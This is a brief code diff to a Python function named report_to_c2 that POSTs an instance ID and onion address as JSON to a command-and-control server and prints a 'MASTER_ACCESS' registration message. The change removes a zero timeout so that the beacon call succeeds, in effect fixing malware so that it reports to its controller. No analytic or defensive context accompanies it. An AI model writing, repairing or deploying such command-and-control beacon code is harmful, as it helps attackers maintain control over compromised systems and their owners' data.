@@ -40,7 +40,7 @@ def report_to_c2(instance_id, onion_address):
                                      data=json.dumps(data).encode('utf-8'),
                                      headers={'Content-Type': 'application/json'},
                                      method='POST')
-        with urllib.request.urlopen(req, 0) as resp:
+        with urllib.request.urlopen(req) as resp:
             if resp.status == 200:
                 print("MASTER_ACCESS: C2 Registration Successful.")
     except Exception as e:
